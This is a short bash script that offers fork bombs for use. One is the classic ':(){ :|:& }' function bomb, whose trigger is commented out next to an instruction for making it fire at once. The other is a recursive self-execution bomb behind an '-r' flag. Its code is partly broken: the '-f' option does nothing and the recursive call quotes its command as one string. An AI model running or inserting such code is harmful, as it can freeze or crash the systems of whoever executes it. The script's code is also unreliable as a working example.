#!/usr/bin/env bash

## The classic bash forkbomb

# function bomb
:(){ :|:& } ##;: <-- uncomment this for an immediate forkbomb

# recursive script
rs() {
    local flag
    local p
    flag="${1:-r}"
    p=$(dirname "${0}")
    "${p}/${0##*/} -${flag}"|"${p}/${0##*/} -${flag}"&
}

usage() {
    cat <<EOF
${0##*/} [-f][-r][-h]: Drop a formbomb
    -f: Use the classic function bomb
    -r: Use recursive script execution
    -h: Display this message
EOF
    exit "${1:-0}"
}

[ "$#" -lt 1 ] && echo "No forkbomb selected" && exit 1

while getopts :frh f; do
    case $f in
        f)
            ## the function option
            :
            ;;
        r)
            ## recursive script
            rs "${f}"
            ;;
        h)
            usage
            ;;
        \?)
            echo "Unknown flag ${OPTARG}"
            usage 2
            ;;
    esac
done
